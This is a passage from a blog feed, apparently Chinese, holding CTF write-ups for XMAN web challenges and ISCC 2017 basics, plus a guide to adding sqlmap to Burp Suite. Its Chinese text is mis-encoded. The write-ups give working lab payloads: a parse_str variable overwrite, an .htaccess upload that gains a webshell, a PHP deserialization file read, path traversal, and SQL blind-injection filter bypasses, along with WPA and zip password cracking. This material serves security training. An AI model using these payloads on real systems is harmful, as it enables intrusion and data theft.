    <content type="html"><![CDATA[<h2 id="variacover"><a href="#variacover" class="headerlink" title="variacover"></a>variacover</h2><a id="more"></a>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">&lt;meta charset=<span class="string">"utf-8"</span>&gt;</div><div class="line"><span class="meta">&lt;?php</span></div><div class="line">error_reporting(<span class="number">0</span>);</div><div class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>($_GET[<span class="string">'b'</span>])) &#123;</div><div class="line">    show_source(<span class="keyword">__FILE__</span>);</div><div class="line">    <span class="keyword">die</span>();</div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line">    <span class="keyword">include</span>(<span class="string">'flag.php'</span>);</div><div class="line">$a = <span class="string">"www.XMAN.com"</span>;</div><div class="line">$b = $_GET[<span class="string">'b'</span>];</div><div class="line">@parse_str($b);</div><div class="line"><span class="keyword">if</span> ($a[<span class="number">0</span>] != <span class="string">'QNKCDZO'</span> &amp;&amp; md5($a[<span class="number">0</span>]) == md5(<span class="string">'QNKCDZO'</span>)) &#123;</div><div class="line">    <span class="keyword">echo</span> $flag;</div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line"><span class="keyword">exit</span>(<span class="string">'ä½ çš„ç­”æ¡ˆä¸å¯¹0.0'</span>);</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<p>é¢˜ç›®ç›´æ¥ç»™äº†æºä»£ç ï¼Œå‰å‡ å¤©åˆšåšè¿‡çš„parse_str å˜é‡è¦†ç›–æ¼æ´ï¼Œparse_strä¼šå°†ä¼ å…¥çš„å­—ç¬¦ä¸²è§£ææˆphpå˜é‡ï¼Œè¿™é‡Œæ„é€ getè¯·æ±‚<code>?b=a[0]=mCDemCDe</code>ï¼Œå³å¯æ‹¿åˆ°flag<br><code>XMAN{A_sTr_covcderd_t3st_you_oW?}</code></p>
<h2 id="urldecode"><a href="#urldecode" class="headerlink" title="urldecode"></a>urldecode</h2><p>çœ‹é¢˜ç›®æç¤ºäº†urlç¼–ç ï¼Œhackbaré‡Œç‚¹äº†ä¸¤æ¬¡urlencodeå°±getflagäº†<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://challenges.xctf.org.cn:7772/?me=%25%35%38%25%34%64%25%34%31%25%34%65</div></pre></td></tr></table></figure></p>
<p>flag:<code>XMAN{UrlDeCode_CooL_yOu_u0D3rSta9D!}</code></p>
<h2 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h2><p>è¿™é“é¢˜æ˜¯èµ›ååšå‡ºæ¥çš„ï¼Œå‰é¢å„ç§ä¸Šä¼ éƒ½æ²¡æœ‰æˆåŠŸï¼Œåæ¥å¬äººè¯´æ˜¯<code>.htaccessä¸Šä¼ </code>ï¼Œäºæ˜¯å­¦ä¹ äº†ä¸€æ³¢ï¼Œä¸Šä¼ ä¸€ä¸ªæ„é€ è¿‡çš„<code>.htaccess</code>æ–‡ä»¶ï¼Œå°±å¯ä»¥æŒ‡å®šåç¼€ä¸º<code>xxxx</code>çš„æ–‡ä»¶è§£ææˆphpï¼Œå†ä¸Šä¼ ä¸€ä¸ª<code>xxxxåç¼€</code>çš„æ–‡ä»¶å³å¯getshellï¼Œç„¶åèœåˆ€è¿æ¥æ‹¿ä¸‹flag,<code>.htaccess</code>æ–‡ä»¶å¦‚ä¸‹:</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">FilesMatch</span> "<span class="attr">xiha</span>"&gt;</span></div><div class="line">SetHandler application/x-httpdä¸€php</div><div class="line"><span class="tag">&lt;/<span class="name">FilesMatch</span>&gt;</span></div></pre></td></tr></table></figure>
<h2 id="unserialize"><a href="#unserialize" class="headerlink" title="unserialize"></a>unserialize</h2><p>è·Ÿç€é¢˜ç›®æç¤º <code>?code=1 --&gt;flag.php--&gt; help.php</code><br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileClass</span></span>&#123;</div><div class="line">    <span class="keyword">public</span> $filename = <span class="string">'error.log'</span>;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</div><div class="line">        <span class="keyword">return</span> file_get_contents(<span class="keyword">$this</span>-&gt;filename);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>ç»å…¸çš„phpååºåˆ—åŒ–ï¼Œæ„é€ <br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?code=O:9:&quot;FileClass&quot;:1:&#123;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;&#125;</div></pre></td></tr></table></figure></p>
<p>å³å¯è¯»å–<code>flag.php</code>æ–‡ä»¶,flag:<code>XMAN{UUNser1AL1Z3_XMAN__0)(0}</code></p>
<h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><p><code>index.php~</code> æœ‰<code>index.php</code>çš„æºä»£ç ï¼Œ</p>
<p>è€ƒå¯Ÿçš„æ˜¯phpå‡ ä¸ªå¼±ç±»å‹è¿˜æœ‰å‡½æ•°çš„ç»•è¿‡æ¼æ´ï¼ŒISCC2017ä¸­åšè¿‡ç±»ä¼¼çš„é¢˜ï¼Œæ‰€ä»¥æ‰‹å¿«ä¸€è¡€äº†<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$a=<span class="number">0</span>;</div><div class="line">$b=<span class="number">0</span>;</div><div class="line">$c=<span class="number">0</span>;</div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'aaa'</span>]))</div><div class="line">&#123;</div><div class="line">        $aaa = $_GET[<span class="string">'aaa'</span>];</div><div class="line">        $aaa==<span class="string">"1"</span>?<span class="keyword">die</span>(<span class="string">"Emmm..."</span>):<span class="keyword">NULL</span>;</div><div class="line">        <span class="keyword">switch</span> ($aaa)</div><div class="line">        &#123;</div><div class="line">        <span class="keyword">case</span> <span class="number">0</span>:</div><div class="line">        <span class="keyword">case</span> <span class="number">1</span>:</div><div class="line">                $a=<span class="number">1</span>;</div><div class="line">                <span class="keyword">break</span>;</div><div class="line">        &#125;</div><div class="line">&#125;</div><div class="line">$bbb=(<span class="keyword">array</span>)json_decode(@$_GET[<span class="string">'bbb'</span>]);</div><div class="line"><span class="keyword">if</span>(is_array($bbb))&#123;</div><div class="line">    is_numeric(@$bbb[<span class="string">"ccc"</span>])?<span class="keyword">die</span>(<span class="string">"Emmm..."</span>):<span class="keyword">NULL</span>;</div><div class="line">    <span class="keyword">if</span>(@$bbb[<span class="string">"ccc"</span>])&#123;</div><div class="line">        ($bbb[<span class="string">"ccc"</span>]&gt;<span class="number">2017</span>)?$b=<span class="number">1</span>:<span class="keyword">NULL</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span>(is_array(@$bbb[<span class="string">"ddd"</span>]))&#123;</div><div class="line">        <span class="keyword">if</span>(count($bbb[<span class="string">"ddd"</span>])!==<span class="number">2</span> <span class="keyword">OR</span> !is_array($bbb[<span class="string">"ddd"</span>][<span class="number">0</span>])) <span class="keyword">die</span>(<span class="string">"Emmm..."</span>);</div><div class="line">        $eee = array_search(<span class="string">"XMAN"</span>, $bbb[<span class="string">"ddd"</span>]);</div><div class="line">        $eee===<span class="keyword">false</span>?<span class="keyword">die</span>(<span class="string">"Emmm..."</span>):<span class="keyword">NULL</span>;</div><div class="line">        <span class="keyword">foreach</span>($bbb[<span class="string">"ddd"</span>] <span class="keyword">as</span> $key=&gt;$val)&#123;</div><div class="line">            $val===<span class="string">"XMAN"</span>?<span class="keyword">die</span>(<span class="string">"Emmm..."</span>):<span class="keyword">NULL</span>;</div><div class="line">        &#125;</div><div class="line">        $c=<span class="number">1</span>;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"><span class="keyword">if</span>($a &amp;&amp; $b &amp;&amp; $c)&#123;</div><div class="line">    <span class="keyword">include</span> <span class="string">"flag.php"</span>;</div><div class="line">    <span class="keyword">echo</span> $flag;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>è¦è®©a,b,cä¸‰ä¸ªå˜é‡ç­‰1æ‰èƒ½æ‹¿åˆ°flag<br>äºæ˜¯æ„é€ <code>?aaa=0&amp;bbb={&quot;ccc&quot;:&quot;2018a&quot;,&quot;ddd&quot;:[[],0]}</code><br>æ€»è§£ä¸€ä¸‹å‡ ä¸ªç»•è¿‡çš„ç‚¹ï¼š</p>
<ul>
<li><code>($bbb[&quot;ccc&quot;]&gt;2017)</code>:å½“<code>$bbb[&quot;ccc&quot;]</code>ä¸º<code>&quot;2018a&quot;</code>æ—¶ä¼šå˜æˆ<code>2018</code>ï¼Œå³å¯ç»•è¿‡</li>
<li><code>$eee = array_search(&quot;XMAN&quot;, $bbb[&quot;ddd&quot;]);</code>å› ä¸º array_search    å‡½æ•°æ²¡æœ‰åŠ ç¬¬ä¸‰ä¸ªå‚æ•°trueï¼Œæ‰€ä»¥æ˜¯å¼±ç±»å‹çš„æ¯”è¾ƒ,<code>XMAN</code>ä¼šå˜æˆ0,äºæ˜¯æ„é€ <code>&quot;ddd&quot;:[[],0]</code> ,å°±å˜æˆ<code>array_search(0, [[],0]);</code>è¿”å›true</li>
</ul>
<h2 id="download"><a href="#download" class="headerlink" title="download"></a>download</h2><p>Codiadçš„æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œæ¯”èµ›çš„æ—¶å€™ä¸€ç›´æ²¡åŒ…å«æˆåŠŸï¼Œåæ¥å‘ç°æ˜¯æˆ‘æ²¡ç™»å½•</p>
<p>å¼±å£ä»¤ <code>admin</code> <code>admin</code>ï¼Œç™»é™†ä¹‹åè®¿é—®<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://challenges.xctf.org.cn:7775/components/filemanager/download.php?path=../../../../var/www/flag.txt&amp;amp;amp;type=undefined</div></pre></td></tr></table></figure></p>
<p>å°±èƒ½æ‹¿åˆ°flagï¼Œä¸€èˆªå¤§ä½¬æŒ–åˆ°äº†0dayè¿˜ç”³è¯·äº†CVEï¼Œè†œä¸€ä¸‹</p>
<h2 id="CTFç”¨æˆ·ç™»å½•"><a href="#CTFç”¨æˆ·ç™»å½•" class="headerlink" title="CTFç”¨æˆ·ç™»å½•"></a>CTFç”¨æˆ·ç™»å½•</h2><p>ä¸€é“å‘é¢˜ï¼Œç›²æ³¨ï¼Œç©ºæ ¼è¿‡æ»¤äº†ç”¨<code>%0a</code>ä»£æ›¿ï¼Œé€—å·è¿‡æ»¤äº†ç”¨<code>from for</code>ä»£æ›¿<br>æœ€åçš„flagæ˜¯<code>ctf_users</code>ä¸­flagç”¨æˆ·çš„å¯†ç è§£<code>base64</code><br><code>XMAN{DO_you_l1ke_sqlmap_sqlmap}</code><br>åˆ°å¾ˆåé¢æ‰æ”¾çš„hint <code>flagåœ¨ctf_usersè¡¨é‡Œ</code>ï¼Œæˆ‘åœ¨ctf_flagsè¡¨é‡Œç›²æ³¨äº†åŠå¤©ï¼Œç½‘é€Ÿè¿˜æ…¢ï¼Œå°±å¾ˆéš¾å—ã€‚</p>
<h2 id="Welcome2IRC"><a href="#Welcome2IRC" class="headerlink" title="Welcome2IRC"></a>Welcome2IRC</h2><p>ircè¿æ¥å°±æœ‰flagäº†ï¼Œç­¾åˆ°é¢˜</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;variacover&quot;&gt;&lt;a href=&quot;#variacover&quot; class=&quot;headerlink&quot; title=&quot;variacover&quot;&gt;&lt;/a&gt;variacover&lt;/h2&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://www.codemonster.cn/tags/CTF/"/>
    
      <category term="WriteUp" scheme="https://www.codemonster.cn/tags/WriteUp/"/>
    
      <category term="php" scheme="https://www.codemonster.cn/tags/php/"/>
    
      <category term="æ–‡ä»¶åŒ…å«" scheme="https://www.codemonster.cn/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    
      <category term="ä¸Šä¼ " scheme="https://www.codemonster.cn/tags/%E4%B8%8A%E4%BC%A0/"/>
    
      <category term="SQLæ³¨å…¥" scheme="https://www.codemonster.cn/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
      <category term="ååºåˆ—åŒ–" scheme="https://www.codemonster.cn/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
      <category term="ç›²æ³¨" scheme="https://www.codemonster.cn/tags/%E7%9B%B2%E6%B3%A8/"/>
    
  </entry>
  
  <entry>
    <title>æ¸—é€ç¥å™¨åˆä½“ï¼šåœ¨BurpSuiteä¸­é›†æˆSqlmap</title>
    <link href="https://www.codemonster.cn/2017/07/13/burpSuite-add-sqlmap/"/>
    <id>https://www.codemonster.cn/2017/07/13/burpSuite-add-sqlmap/</id>
    <published>2017-07-13T02:44:25.000Z</published>
    <updated>2018-05-04T07:47:50.015Z</updated>
    
    <content type="html"><![CDATA[<p>å‚è€ƒé“¾æ¥ï¼š<a href="http://www.freebuf.com/sectool/45239.html" target="_blank" rel="noopener">http://www.freebuf.com/sectool/45239.html</a><br><a id="more"></a><br>é¦–å…ˆå®‰è£…sqlmapï¼Œä¼ é€é—¨ï¼š<a href="http://sqlmap.org/" target="_blank" rel="noopener">http://sqlmap.org/</a><br>å°†sqlmap.pyåŠ å…¥åˆ°pathä¸­ï¼ˆåœ¨cmdä¸­è¾“å…¥sqlmap.pyä¸ä¼šæŠ¥æ‰¾ä¸åˆ°æ–‡ä»¶ï¼‰<br>ä¸‹è½½ä¾èµ–çš„jaråŒ…ï¼š <code>commons-io-2.4.jar</code>ï¼Œ<br>é…ç½®è·¯å¾„ä¸ºï¼š<code>extender--&gt;options--&gt;Java Environment</code>ï¼Œé€‰æ‹©è¯¥jaråŒ…æ‰€åœ¨ç›®å½•</p>
<p>ä¸‹è½½<code>sqlmap4burp</code>ï¼š<br>github: <a href="https://github.com/difcareer/sqlmap4burp" target="_blank" rel="noopener">https://github.com/difcareer/sqlmap4burp</a><br>ç¼–è¯‘æ­¤é¡¹ç›®ä¸ºå•ç‹¬çš„ä¸€ä¸ªjaræ–‡ä»¶ï¼ˆç¼–è¯‘å‰å…ˆå¯¼å…¥æ‰€éœ€çš„jaråŒ…ï¼Œ<code>commons-lang3</code>å’Œ<code>commons-io</code>ï¼‰ï¼Œæ·»åŠ åˆ°burpsuiteçš„javaæ’ä»¶ä¸­ï¼Œ<br>é…ç½®è·¯å¾„ä¸ºï¼šextenderâ€“&gt;extentionsâ€“&gt;add<br>ä¹‹åä½ å°†ä¼šçœ‹åˆ°åœ¨ä¸»é¡µé¢ä¸­ä¼šæ–°å¢ä¸€ä¸ªtabï¼Œåå­—å«åšSqlmap</p>
<p>æ’ä»¶åŸç†æ˜¯å°†ç›®æ ‡è¯·æ±‚çš„æ•°æ®å­˜æ”¾åˆ°ä¸´æ—¶æ–‡ä»¶ä¸­ï¼Œç„¶åè°ƒç”¨<code>&quot;sqlmap.py -r $file&quot;</code>æ¥å¯åŠ¨å¯¹è¯·æ±‚çš„sqlæ³¨å…¥æ£€æµ‹ åœ¨Sqlmap tabä¸­ï¼Œä½ å¯ä»¥é…ç½®sqlmapé™¤ -rå¤–çš„å…¶ä»–å‚æ•°ï¼Œæ¯”å¦‚ï¼š<br>åŠ å…¥é…ç½®ä¸­å†™ï¼š<code>&quot;--level 3&quot;</code>,çœŸå®æ‰§è¡Œæ—¶æ˜¯ï¼š<code>sqlmap.py -r $file --level 3</code><br>å›åˆ°burpsuiteä¸»é¡µé¢ï¼Œåœ¨ä»»ä½•è¯·æ±‚è¿æ¥ä¸Šå³é”®ï¼Œä¼šçœ‹åˆ°æ–°å¢<code>&quot;send to Sqlmap&quot;</code>ï¼Œç‚¹å‡»åä¼šå¼€å¯cmdçª—å£ï¼Œé’ˆå¯¹æ­¤è¯·æ±‚è¿›è¡Œsqlæ³¨å…¥æ£€æµ‹</p>
<p><img src="/img/burp+sqlmap.png" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;å‚è€ƒé“¾æ¥ï¼š&lt;a href=&quot;http://www.freebuf.com/sectool/45239.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://www.freebuf.com/sectool/45239.html&lt;/a&gt;&lt;br&gt;
    
    </summary>
    
    
      <category term="burpsuite" scheme="https://www.codemonster.cn/tags/burpsuite/"/>
    
      <category term="sqlmap" scheme="https://www.codemonster.cn/tags/sqlmap/"/>
    
      <category term="æ’ä»¶" scheme="https://www.codemonster.cn/tags/%E6%8F%92%E4%BB%B6/"/>
    
      <category term="å·¥å…·" scheme="https://www.codemonster.cn/tags/%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>2017 ISCC Basic WriteUp</title>
    <link href="https://www.codemonster.cn/2017/06/26/2017-iscc-basic-writeup/"/>
    <id>https://www.codemonster.cn/2017/06/26/2017-iscc-basic-writeup/</id>
    <published>2017-06-26T05:29:39.000Z</published>
    <updated>2018-05-04T07:47:50.011Z</updated>
    
    <content type="html"><![CDATA[<p>ç”±äºç½‘ç«™å¤‡æ¡ˆåŸå› ï¼Œåšå®¢åœæ­¢æ›´æ–°äº†ä¸€ä¸ªæœˆï¼Œæ¥ä¸‹æ¥ä¼šé™†ç»­æŠŠä¸­é—´ç§¯ç´¯ä¸‹çš„æ¯”èµ›writeupå’Œå­¦ä¹ ç»éªŒè¡¥ä¸Šã€‚<br><a id="more"></a></p>
<h2 id="Basic-1-Wheel-Cipher-ï¼ˆ50ï¼‰"><a href="#Basic-1-Wheel-Cipher-ï¼ˆ50ï¼‰" class="headerlink" title="Basic 1 Wheel Cipher ï¼ˆ50ï¼‰"></a>Basic 1 Wheel Cipher ï¼ˆ50ï¼‰</h2><p>åŠ å¯†è¡¨ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">ZWAXJGDLUBVIQHKYPNTCRMOSFE</div><div class="line">KPBELNACZDTRXMJQOYHGVSFUWI</div><div class="line">BDMAIZVRNSJUWFHTEQGYXPLOCK</div><div class="line">RPLNDVHGFCUKTEBSXQYIZMJWAO</div><div class="line">IHFRLABEUOTSGJVDKCPMNZQWXY</div><div class="line">AMKGHIWPNYCJBFZDRUSLOQXVET</div><div class="line">GWTHSPYBXIZULVKMRAFDCEONJQ</div><div class="line">NOZUTWDCVRJLXKISEFAPMYGHBQ</div><div class="line">XPLTDSRFHENYVUBMCQWAOIKZGJ</div><div class="line">UDNAJFBOWTGVRSCZQKELMXYIHP</div><div class="line">MNBVCXZQWERTPOIUYALSKDJFHG</div><div class="line">LVNCMXZPQOWEIURYTASBKJDFHG</div><div class="line">JZQAWSXCDERFVBGTYHNUMKILOP</div></pre></td></tr></table></figure></p>
<p>å¯†é’¥ä¸ºï¼š<code>2ï¼Œ3ï¼Œ7ï¼Œ5ï¼Œ13,12,9ï¼Œ1ï¼Œ8ï¼Œ10ï¼Œ4ï¼Œ11ï¼Œ6</code><br><br>å¯†æ–‡ä¸ºï¼š<code>NFQKSEVOQOFNP</code><br><br>æ–°ç¥å‘Šè¯‰æˆ‘è¿™æ˜¯<br><a href="https://en.wikipedia.org/wiki/Jefferson_disk" target="_blank" rel="noopener">æ°å¼—é€Šè½®ç›˜</a><br>ç¼–å†™pythonè„šæœ¬å¦‚ä¸‹<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/python</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"><span class="comment"># by: CodeMonster</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> base64</div><div class="line"></div><div class="line">s=[<span class="string">"ZWAXJGDLUBVIQHKYPNTCRMOSFE"</span>,<span class="string">"KPBELNACZDTRXMJQOYHGVSFUWI"</span>,<span class="string">"BDMAIZVRNSJUWFHTEQGYXPLOCK"</span>,<span class="string">"RPLNDVHGFCUKTEBSXQYIZMJWAO"</span>,<span class="string">"IHFRLABEUOTSGJVDKCPMNZQWXY"</span>,<span class="string">"AMKGHIWPNYCJBFZDRUSLOQXVET"</span>,<span class="string">"GWTHSPYBXIZULVKMRAFDCEONJQ"</span>,<span class="string">"NOZUTWDCVRJLXKISEFAPMYGHBQ"</span>,<span class="string">"XPLTDSRFHENYVUBMCQWAOIKZGJ"</span>,<span class="string">"UDNAJFBOWTGVRSCZQKELMXYIHP"</span>,<span class="string">"MNBVCXZQWERTPOIUYALSKDJFHG"</span>,<span class="string">"LVNCMXZPQOWEIURYTASBKJDFHG"</span>,<span class="string">"JZQAWSXCDERFVBGTYHNUMKILOP"</span>]</div><div class="line">num=[<span class="number">2</span>,<span class="number">3</span>,<span class="number">7</span>,<span class="number">5</span>,<span class="number">13</span>,<span class="number">12</span>,<span class="number">9</span>,<span class="number">1</span>,<span class="number">8</span>,<span class="number">10</span>,<span class="number">4</span>,<span class="number">11</span>,<span class="number">6</span>]</div><div class="line"></div><div class="line">a=<span class="string">"NFQKSEVOQOFNP"</span></div><div class="line"></div><div class="line"><span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">26</span>):</div><div class="line">    flag=<span class="string">""</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(num)):</div><div class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">26</span>):</div><div class="line">            <span class="keyword">if</span> a[i]==s[num[i]<span class="number">-1</span>][j]:</div><div class="line">                <span class="keyword">if</span>  j-k&amp;gt;=<span class="number">0</span>:</div><div class="line">                    flag=flag+s[num[i]<span class="number">-1</span>][j-k]</div><div class="line">                <span class="keyword">else</span>:</div><div class="line">                    flag=flag+s[num[i]<span class="number">-1</span>][j+<span class="number">26</span>-k]</div><div class="line">                <span class="keyword">break</span></div><div class="line">    <span class="keyword">print</span> flag</div></pre></td></tr></table></figure></p>
<p>è¿è¡Œåæ‰¾åˆ°æœ€åƒflagçš„ä¸€æ¡ï¼Œflagä¸º <code>FIREINTHEHOLE</code></p>
<p><img src="/img/2017iscc1.jpg" alt=""></p>
<h2 id="Basic-2-ä½ çŒœçŒœã€‚ã€‚-ï¼ˆ100ï¼‰"><a href="#Basic-2-ä½ çŒœçŒœã€‚ã€‚-ï¼ˆ100ï¼‰" class="headerlink" title="Basic 2 ä½ çŒœçŒœã€‚ã€‚ ï¼ˆ100ï¼‰"></a>Basic 2 ä½ çŒœçŒœã€‚ã€‚ ï¼ˆ100ï¼‰</h2><p>æ‰“å¼€é‡Œé¢æ˜¯è¿™æ ·ä¸€æ®µä»£ç <br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">504B03040A0001080000626D0A49F4B5091F1E0000001200000008000000666C61672E7478746C9F170D35D0A45826A03E161FB96870EDDFC7C89A11862F9199B4CD78E7504B01023F000A0001080000626D0A49F4B5091F1E00000012000000080024000000000000002000000000000000666C61672E7478740A0020000000000001001800AF150210CAF2D1015CAEAA05CAF2D1015CAEAA05CAF2D101504B050600000000010001005A000000440000000000`&lt;/pre&gt;</div></pre></td></tr></table></figure></p>
<p>çœ‹åˆ°504B0304ï¼Œå¾ˆæ˜æ˜¾çš„zipå‹ç¼©æ–‡ä»¶å¤´ï¼Œç²˜è´´åˆ°winhexä¿å­˜ä¸ºzipæ–‡ä»¶ï¼Œzipé‡Œæœ‰ä¸ª<code>flag.txt</code>æ–‡ä»¶</p>
<p>ä½†æ˜¯æœ‰å¯†ç ï¼Œçˆ†ç ´å¾—åˆ°å¯†ç 123456ï¼Œflagä¸º<code>daczcasdqwdcsdzasd</code></p>
<h2 id="Basic-3-ç¥ç§˜å›¾ç‰‡-ï¼ˆ100ï¼‰"><a href="#Basic-3-ç¥ç§˜å›¾ç‰‡-ï¼ˆ100ï¼‰" class="headerlink" title="Basic 3 ç¥ç§˜å›¾ç‰‡ ï¼ˆ100ï¼‰"></a>Basic 3 ç¥ç§˜å›¾ç‰‡ ï¼ˆ100ï¼‰</h2><p>ç»™äº†ä¸€å¼ pngçš„å›¾ç‰‡ï¼Œç›´æ¥ç”¨<code>ExtractPNG.exe</code>å·¥å…·ï¼Œä»å›¾ç‰‡ä¸­æå–å‡ºäº†flagï¼Œflagä¸º<code>goodlcuk</code></p>
<h2 id="Basic-4-å‘Šè¯‰ä½ ä¸ªç§˜å¯†-ï¼ˆ100ï¼‰"><a href="#Basic-4-å‘Šè¯‰ä½ ä¸ªç§˜å¯†-ï¼ˆ100ï¼‰" class="headerlink" title="Basic 4 å‘Šè¯‰ä½ ä¸ªç§˜å¯† ï¼ˆ100ï¼‰"></a>Basic 4 å‘Šè¯‰ä½ ä¸ªç§˜å¯† ï¼ˆ100ï¼‰</h2><p>ç»™äº†è¿™æ ·ä¸€æ®µä¸œè¥¿<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">636A56355279427363446C4A49454A7154534230526D684356445A31614342354E326C4B4946467A5769426961453067</div></pre></td></tr></table></figure></p>
<p>16è¿›åˆ¶è½¬asciiï¼Œç„¶åå†base64è§£ç å¾—åˆ°<code>r5yG lp9I BjM tFhB T6uh y7iJ QsZ bhM</code><br>è¿™é‡Œå¡äº†å¥½ä¹…ï¼Œåæ¥å‘ç°é”®ç›˜ä¸­ r5yGåœˆç€Tï¼Œlp9Iåœˆç€Oï¼Œä»¥æ­¤ç±»æ¨ï¼Œflagä¸º<code>TONGYUAN</code></p>
<h2 id="Basic-5-äºŒç»´ç "><a href="#Basic-5-äºŒç»´ç " class="headerlink" title="Basic 5 äºŒç»´ç "></a>Basic 5 äºŒç»´ç </h2><p>æ‰«æäºŒç»´ç æç¤ºflagæ˜¯è·¯ç”±å™¨å¯†ç <br>binwalkåˆ†æäºŒç»´ç å‘ç°éšè—äº†ä¸€ä¸ªå‹ç¼©æ–‡ä»¶ï¼Œåˆ†ç¦»å‡ºæ¥åçœ‹åˆ°é‡Œé¢æœ‰ä¸¤ä¸ªæ–‡ä»¶ï¼Œä¸€ä¸ªcapï¼Œä¸€ä¸ªç ´è§£è®°å½•<br>çˆ†ç ´zipå¯†ç å¾—åˆ°å¯†ç ï¼Œè§£å‹åæ ¹æ®ç ´è§£è®°å½•çš„æç¤ºï¼Œè·¯ç”±å™¨å¯†ç å‰å››ä½ä¸ºISCCï¼Œåå››ä½å¤§å†™å­—æ¯åŠ æ•°å­—ã€‚<br>ç”¨kaliè‡ªå¸¦çš„aircrack-ngè¿›è¡Œçˆ†ç ´<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">aircrack-ng wifi.cap -w dic.txt</div></pre></td></tr></table></figure></p>
<p>å…¶ä¸­dic.txtæ˜¯å­—å…¸ï¼Œwifi.capå°±æ˜¯é‚£ä¸ªcapæ–‡ä»¶</p>
<p><img src="/img/2017iscc2.jpg" alt=""></p>
<p>çˆ†ç ´å‡ºè·¯ç”±å™¨å¯†ç ï¼Œæ‰€ä»¥flagä¸º <code>ISCC16BA</code></p>
]]></content>
    
    <summary type="html">
    
